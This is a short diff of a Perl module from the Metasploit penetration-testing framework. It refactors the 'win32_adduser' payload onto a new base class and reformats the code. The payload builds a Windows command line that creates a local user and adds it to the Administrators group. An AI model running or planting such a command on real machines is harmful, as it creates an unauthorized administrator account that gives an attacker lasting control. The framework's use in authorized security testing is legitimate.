@@ -9,11 +9,7 @@
 
 package Msf::Payload::win32_adduser;
 use strict;
-use base 'Msf::PayloadComponent::Win32Execute';
-sub _Load {
-  Msf::PayloadComponent::Win32Execute->_Import('Msf::PayloadComponent::NoConnection');
-  __PACKAGE__->SUPER::_Load();
-}
+use base 'Msf::PayloadComponent::Windows::ia32::ExecuteCommand';
 
 my $info =
 {
@@ -30,25 +26,41 @@ my $info =
     },
 };
 
-sub new {
-  _Load();
-  my $class = shift;
-  my $hash = @_ ? shift : { };
-  $hash = $class->MergeHashRec($hash, {'Info' => $info});
-  my $self = $class->SUPER::new($hash, @_);
-  return($self);
+sub _Load 
+{
+	Msf::PayloadComponent::Windows::ia32::ExecuteCommand->_Import('Msf::PayloadComponent::NoConnection');
+
+	__PACKAGE__->SUPER::_Load();
 }
 
-sub CommandString {
-  my $self = shift;
-  my $user = $self->GetVar('USER') || 'metasploit';
-  my $pass = $self->GetVar('PASS') || '';
+sub new 
+{
+	my $class = shift;
+	my $hash = @_ ? shift : { };
+	my $self;
 
-  my $command =
-  "cmd.exe /c net user $user $pass /ADD && ".
-  "net localgroup Administrators $user /ADD";
+	_Load();
 
-  return($command);
+	$hash = $class->MergeHashRec($hash, {'Info' => $info});
+	$self = $class->SUPER::new($hash, @_);
+
+	return($self);
+}
+
+#
+# Execute a net user addition
+#
+sub CommandString 
+{
+	my $self = shift;
+	my $user = $self->GetVar('USER') || 'metasploit';
+	my $pass = $self->GetVar('PASS') || '';
+
+	my $command =
+		"cmd.exe /c net user $user $pass /ADD && ".
+		"net localgroup Administrators $user /ADD";
+
+	return $command;
 }
 
 1;
